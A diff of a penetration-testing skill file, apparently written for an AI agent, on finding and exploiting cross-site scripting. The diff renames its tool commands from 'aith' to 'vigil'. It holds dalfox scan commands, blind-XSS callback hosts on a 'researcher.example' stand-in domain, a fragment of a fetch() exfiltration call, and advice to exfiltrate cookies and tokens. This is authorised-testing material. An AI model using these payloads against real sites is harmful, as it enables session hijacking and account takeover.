@@ -1,7 +1,7 @@
 ---
 name: xss-testing
 description: Detect and exploit cross-site scripting vulnerabilities in web applications — DOM XSS in modern SPAs, framework-specific sinks, CSP bypass, blind XSS, WAF evasion
-origin: AI Threat Hunting
+origin: Vigil
 ---
 
 # XSS Testing
@@ -18,10 +18,10 @@ Most XSS findings in 2025 are in client-side rendering contexts (React `dangerou
 
 ## Tools
 
-- `aith assess kali exec -- dalfox ...` (automated reflected XSS scanner — all target-facing tool invocations must go through the kali exec wrapper; use `--technique XSS --probe-kind payload --phase consume-test --timeout 300`)
-- `aith assess kali exec -- curl ...` (manual request crafting and response analysis — use `--technique XSS --probe-kind payload --phase consume-test --timeout 30`)
+- `vigil assess kali exec -- dalfox ...` (automated reflected XSS scanner — all target-facing tool invocations must go through the kali exec wrapper; use `--technique XSS --probe-kind payload --phase consume-test --timeout 300`)
+- `vigil assess kali exec -- curl ...` (manual request crafting and response analysis — use `--technique XSS --probe-kind payload --phase consume-test --timeout 30`)
 - Browser DevTools — DOM inspection, source-to-sink tracing, event listener enumeration (client-side analysis only)
-- `aith oob mint` / `aith oob poll` — blind XSS verification: mint a nonce-tagged callback host per injection point, embed it in the payload, then `poll` to see which planted payload fired and where (replaces eyeballing the raw listener log). Check readiness with `aith oob status --json`; if no named client is running, start one with `aith oob client start <name> --engagement <key> --agent <agent>`.
+- `vigil oob mint` / `vigil oob poll` — blind XSS verification: mint a nonce-tagged callback host per injection point, embed it in the payload, then `poll` to see which planted payload fired and where (replaces eyeballing the raw listener log). Check readiness with `vigil oob status --json`; if no named client is running, start one with `vigil oob client start <name> --engagement <key> --agent <agent>`.
 
 ---
 
@@ -47,41 +47,41 @@ Target has query parameters reflecting in HTML?
 
 ## Automated Scanning with dalfox
 
-Run dalfox through the kali exec wrapper so every scan lands in the audit pipeline. For blind XSS callbacks, mint the callback host first (`aith oob mint --technique blind-xss --target-url <url> --probe-kind dalfox-blind`) and pass its `http` URL to `--blind`; after the scan, `aith oob poll --client <name>` tells you whether dalfox's blind payload ever rendered.
+Run dalfox through the kali exec wrapper so every scan lands in the audit pipeline. For blind XSS callbacks, mint the callback host first (`vigil oob mint --technique blind-xss --target-url <url> --probe-kind dalfox-blind`) and pass its `http` URL to `--blind`; after the scan, `vigil oob poll --client <name>` tells you whether dalfox's blind payload ever rendered.
 
 ```bash
 # Single URL with parameter
-aith assess kali exec \
+vigil assess kali exec \
   --technique XSS --intent "dalfox reflected XSS scan on search parameter" \
   --probe-kind payload --phase consume-test --timeout 300 \
   -- dalfox url "https://TARGET/search?q=test" --silence
 
 # Pipe discovered URLs (from gau, katana, or param-fuzzing output)
 # Build the URL list host-side first, then pipe via kali exec:
-aith assess kali exec \
+vigil assess kali exec \
   --technique XSS --intent "dalfox pipe scan on discovered URL set" \
   --probe-kind payload --phase consume-test --timeout 900 \
   -- sh -c 'cat /engagements/$ENGAGEMENT_KEY/scans/urls_with_params.txt | dalfox pipe --silence'
 
 # With blind XSS callback — mint the host, capture its http URL, pass to --blind
-OOB_CALLBACK_URL=$(aith oob mint --technique blind-xss \
+OOB_CALLBACK_URL=$(vigil oob mint --technique blind-xss \
   --target-url "https://TARGET/search?q=test" --probe-kind dalfox-blind --json \
   | python3 -c 'import json,sys; print(json.load(sys.stdin)["urls"]["http"])')
-aith assess kali exec \
+vigil assess kali exec \
   --technique XSS --intent "dalfox blind XSS scan with OOB callback" \
   --probe-kind payload --phase consume-test --timeout 300 \
   -- dalfox url "https://TARGET/search?q=test" --blind "$OOB_CALLBACK_URL"
-# Later: aith oob poll --client <name>  → a matched row means the payload fired
+# Later: vigil oob poll --client <name>  → a matched row means the payload fired
 
 # JSON output for triage
-aith assess kali exec \
+vigil assess kali exec \
   --technique XSS --intent "dalfox XSS scan with JSON output" \
   --probe-kind payload --phase consume-test --timeout 300 \
   -- dalfox url "https://TARGET/page?param=test" \
      -o /engagements/$ENGAGEMENT_KEY/scans/xss_results.json --format json
 
 # WAF fingerprinting (run before payload selection)
-aith assess kali exec \
+vigil assess kali exec \
   --technique XSS --intent "dalfox WAF fingerprint before XSS payload selection" \
   --probe-kind fingerprint --phase consume-test --timeout 120 \
   -- dalfox url "https://TARGET/search?q=test" --waf-evasion
@@ -265,7 +265,7 @@ Use an OOB callback to detect when and where the payload fires. **Mint a fresh n
 
 ```bash
 # Mint one callback per planted field; the printed host carries a unique nonce
-aith oob mint --technique blind-xss --target-url "https://target/support/ticket" \
+vigil oob mint --technique blind-xss --target-url "https://target/support/ticket" \
   --param ticket_subject --probe-kind stored-blind
 # → http  http://<nonce>.researcher.example/
 ```
@@ -299,7 +299,7 @@ fetch('https://<nonce>.researcher.example/hit', {
 ### Operational Notes
 
 - **Timing**: Some blind XSS triggers days or weeks after injection. A support ticket might sit in a queue for a week before an admin opens it. Log viewers might only be checked during incident response. Mint the callbacks, then poll periodically and be patient.
-- **Callback verification**: After injecting, confirm shared readiness with `aith oob status --json`, then poll periodically with `aith oob poll --client <name>`. Each matched row carries the `--param`/`--target-url` you minted with, so the hit names the field that rendered and the page it rendered on — no manual log correlation. (`aith logs oob --lines 80` is only for debugging raw server/FRP health.) A matched callback proves the payload executed in an internal context.
+- **Callback verification**: After injecting, confirm shared readiness with `vigil oob status --json`, then poll periodically with `vigil oob poll --client <name>`. Each matched row carries the `--param`/`--target-url` you minted with, so the hit names the field that rendered and the page it rendered on — no manual log correlation. (`vigil logs oob --lines 80` is only for debugging raw server/FRP health.) A matched callback proves the payload executed in an internal context.
 - **Impact escalation**: A blind XSS in an admin panel is not just "XSS." If the admin panel has: user management (account takeover), payment processing (financial impact), server configuration (RCE chain), or API key management (full compromise) — the XSS inherits that blast radius.
 - **Evidence capture**: The callback payload should exfil enough context to prove impact: the URL where it fired (shows it was admin panel), cookies/tokens (shows session hijack is possible), and a DOM snapshot (shows what the admin sees).
 
@@ -409,7 +409,7 @@ Stored XSS requires a two-phase test: inject, then find every location where the
 
 `alert(1)` proves execution. Engagement reports need impact — you must show the attacker outcome, not just code execution.
 
-Mint a callback host for the exfil payload (`aith oob mint --technique blind-xss --probe-kind exfil`), substitute its nonce host below, and confirm the steal landed with `aith oob poll --client <name>`.
+Mint a callback host for the exfil payload (`vigil oob mint --technique blind-xss --probe-kind exfil`), substitute its nonce host below, and confirm the steal landed with `vigil oob poll --client <name>`.
 
 ```javascript
 // Prove execution context
